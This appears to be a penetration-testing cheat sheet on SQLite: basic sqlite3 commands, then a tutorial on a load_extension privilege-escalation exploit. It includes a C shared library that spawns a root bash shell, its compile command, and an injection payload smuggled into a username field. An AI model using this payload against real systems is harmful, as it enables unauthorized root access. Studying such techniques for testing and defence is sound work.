
# SQLite
SQLite is a lightweight, serverless, embedded relational database management system (RDBMS). It's a library that is embedded directly into applications, rather than being a separate server process.

## Useful Commands

```bash
# Open DB file
.open <your_file.db>

# List databases
.databases

# List tables
.tables

# Structure of table
.schema <table>
```

  

# Command Execution

## load_extension exploit

**Scenario**: Suppose we're on Linux and there's a bash script which asks for a username that will be used to activate the user.

The commands looks like this:
```bash
/usr/bin/sqlite3 db.sqlite3 -line \'UPDATE accounts_customuser SET is_active=1 WHERE username=\"%s\";\'
```

1. We need to create a C script.

```c
// test.c

#include <stdlib.h>
#include <unistd.h>

void _init() {
	setuid(0);
	setgid(0);
	system("/bin/bash -i");
}
```

2. Compile the C script into a shared library.

```bash
# Here we create a shared library
gcc -shared -fPIC -nostartfiles -o test.so test.c
```

This library will spawn an elevated shell.

For this to work we're going to create a payload (`"+load_extension('test.so')+"`) that we'll feed to the script. Once the script reaches the point where the username is used in the SQL statement, a shell with elevated privileges will be spawned.

# References
- [https://www.sqlite.org/docs.html](https://www.sqlite.org/docs.html)
- [https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-87cf-j763-vvh8](https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-87cf-j763-vvh8)